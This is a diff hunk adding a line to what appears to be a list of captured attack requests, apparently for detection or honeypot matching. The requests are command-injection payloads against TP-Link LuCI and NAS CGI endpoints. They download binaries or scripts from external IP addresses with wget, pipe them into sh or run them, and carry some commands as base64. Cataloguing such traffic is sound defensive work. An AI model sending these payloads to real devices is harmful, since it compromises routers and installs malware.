@@ -363,6 +363,7 @@ method GET url /cgi-bin/authLogin.cgi
 method GET url /cgi-bin/orospucoc.cgi?user=messagebus&passwd=&cmd=15&system=dW5hbWUJLW0=
 method GET url /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=dW5hbWUJLW0=
 method GET url /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=cm0JLXJmCWxvbAl8CXdnZXQJLU8tCWh0dHA6Ly85NC4xNTYuOC4yNDQvbG9sfHNo
+method GET url /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.17.171%3A88%2Ft%7Csh%3B%60)
 method GET url /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+/tmp;+rm+-rf+shk;+wget+http://103.14.226.142/shk;+chmod+777+shk;+./shk+tplink;+rm+-rf+shk)
 method GET url /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`cd+/tmp;+rm+-rf+shk;+wget+http://103.163.214.97/shk;+chmod+777+shk;+./shk+tplink;+rm+-rf+shk`)
 method GET url /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`cd+/tmp;+rm+-rf+shk;+wget+http://103.14.226.142/shk;+chmod+777+shk;+./shk+tplink;+rm+-rf+shk`)
